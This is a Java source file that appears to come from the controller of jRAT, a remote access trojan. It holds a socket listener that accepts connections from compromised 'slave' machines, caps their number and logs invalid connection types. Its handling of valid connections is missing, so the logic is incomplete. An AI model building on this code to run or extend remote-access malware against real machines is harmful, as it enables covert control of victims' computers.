package jrat.controller.net;

import jrat.common.ConnectionCodes;
import jrat.common.Logger;
import jrat.controller.AbstractSlave;
import jrat.controller.LogAction;
import jrat.controller.Main;
import jrat.controller.Slave;
import jrat.controller.settings.Settings;

import java.net.Socket;

public class ServerListener extends PortListener implements Runnable {

	public ServerListener(String name, int port, int timeout, String pass) throws Exception {
		super(name, port, timeout, pass, Settings.SocketType.SOCKET_NORMAL);
	}

	@Override
	public void run() {
		while (!server.isClosed()) {
			try {
				Socket socket = server.accept();

				try {
					int max = Settings.getGlobal().getInt(Settings.KEY_MAXIMUM_CONNECTIONS);

					if (max != -1 && Main.connections.size() > max) {
						Logger.warn("Maximum connections reached (" + max + "), closing...");
						socket.close();
						continue;
					}
				} catch (Exception ex) {
					ex.printStackTrace();
					Logger.err("Failed to check maximum connections: " + ex.getClass().getSimpleName() + ": " + ex.getMessage());
				}

				int type = socket.getInputStream().read();

				AbstractSlave slave;

				if (type < 0 || type > 1) {
					slave = new Slave(this, socket);
					Main.instance.getPanelLog().addEntry(LogAction.ERROR, slave, "Invalid connection type, accepting anyways");
					continue;
				}
			} catch (Exception ex) {
				ex.printStackTrace();
			}
		}
	}

}
